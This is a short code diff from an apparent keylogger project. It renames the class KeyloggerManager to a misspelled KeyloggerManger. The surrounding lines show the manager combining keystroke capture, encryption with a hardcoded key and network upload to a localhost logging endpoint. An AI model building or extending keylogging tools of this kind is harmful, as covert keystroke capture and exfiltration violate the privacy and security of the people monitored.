@@ -3,7 +3,7 @@ from network_writer import NetworkWriter
 from encryptor import Encryptor
 import time
 
-class KeyloggerManager:
+class KeyloggerManger:
     def __init__(self, key="12345", server_url="http://127.0.0.1:8000/log", local_save_dir=None):
         self.encryptor = Encryptor(key)
         self.keylogger = KeyloggerService(self.encryptor)
